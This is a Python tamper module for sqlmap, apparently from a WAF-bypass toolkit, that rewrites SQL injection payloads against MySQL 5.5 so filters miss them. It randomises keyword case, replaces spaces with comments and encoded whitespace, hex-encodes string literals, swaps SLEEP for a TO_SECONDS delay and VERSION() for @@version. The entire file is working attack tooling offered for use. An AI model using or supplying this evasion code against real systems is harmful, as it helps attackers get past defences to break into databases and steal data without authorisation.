#!/usr/bin/env python

"""
@Project  : ByPassTamperPlus
@File     : mysql55_bypass.py
@Author   : Tas9er / https://www.github.com/Tas9er
@IDE      : PyCharm
"""

import re
import random

from lib.core.enums import PRIORITY

__priority__ = PRIORITY.HIGHEST

def dependencies():
    pass

def tamper(payload, **kwargs):
    if not payload:
        return payload

    def random_case(word):
        return "".join(c.upper() if random.getrandbits(1) else c.lower() for c in word)

    def general_obfuscate(p):
        keywords = [
            "SELECT", "UNION", "FROM", "WHERE", "AND", "OR", "GROUP_CONCAT", "CONCAT",
            "INFORMATION_SCHEMA", "TABLES", "COLUMNS", "TABLE_NAME", "COLUMN_NAME",
            "USER", "CURRENT_USER", "DATABASE", "AS", "LIMIT", "OFFSET", "VERSION",
            "TO_SECONDS", "NOW", "INTERVAL", "SECOND", "CONCAT_WS"
        ]
        for kw in keywords:
            p = re.sub(r"(?i)\b%s\b" % kw, lambda m: random_case(m.group(0)), p)

        p = re.sub(r"(?i)SUBSTRING\(", lambda m: random_case(random.choice(["MID(", "SUBSTR("])), p)

        spaces = ["/**/", "%0a", "%09", "%0b", "%0c", "+", "/*%00*/"]
        p = re.sub(r" ", lambda m: random.choice(spaces), p)

        p = re.sub(r"'([^']*)'", lambda m: "0x" + m.group(1).encode("utf-8").hex(), p)

        return p

    payload = re.sub(r"(?i)SLEEP\((\d+)\)", r"(SELECT(TO_SECONDS(NOW()+INTERVAL \1 SECOND)-TO_SECONDS(NOW())))", payload)

    payload = re.sub(r"(?i)CONCAT\((.*?)\)", r"CONCAT_WS(0x2c,\1)", payload)

    payload = re.sub(r"(?i)VERSION\(\)", "@@version", payload)

    payload = general_obfuscate(payload)

    return payload
